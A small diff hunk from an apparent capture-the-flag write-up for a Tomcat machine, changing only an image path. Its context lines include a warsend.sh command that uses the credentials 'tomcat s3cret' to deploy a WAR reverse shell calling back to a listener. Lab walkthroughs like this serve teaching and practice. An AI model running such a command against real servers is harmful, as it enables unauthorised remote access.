@@ -47,4 +47,4 @@ Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass
 ./warsend.sh 10.10.10.10 9001 10.10.10.1 8080 tomcat s3cret revshell
 ```
 
-![shell](../images/jerry-shell.png)
+![shell](jerry-shell.png)
